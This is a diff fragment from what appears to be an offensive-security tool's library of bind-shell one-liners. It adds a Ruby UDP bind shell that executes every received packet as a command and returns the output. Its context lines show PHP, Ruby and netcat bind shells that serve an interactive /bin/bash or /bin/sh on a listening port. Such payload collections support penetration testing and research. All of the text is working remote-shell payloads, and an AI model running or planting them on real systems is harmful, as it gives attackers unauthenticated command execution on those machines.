@@ -16,6 +16,8 @@ BIND_PHP_UDP = """php -r '$s=socket_create(AF_INET, SOCK_DGRAM, 0);socket_bind($
 
 BIND_RUBY_TCP = """ruby -rsocket -e 'f=TCPServer.new(PORT);s=f.accept;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",s,s,s)'"""
 
+BIND_RUBY_UDP = """ruby -rsocket -e 'require "open3";s=UDPSocket.new;s.bind("0.0.0.0",PORT);loop do d,a=s.recvfrom(1024);out,err,st=Open3.capture3(d);s.send(out,0,a[3],a[1]); end'"""
+
 BIND_NETCAT_TCP = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp PORT >/tmp/f"""
 
 BIND_NETCAT_TRADITIONAL_TCP = "nc -lvp PORT -c /bin/bash"
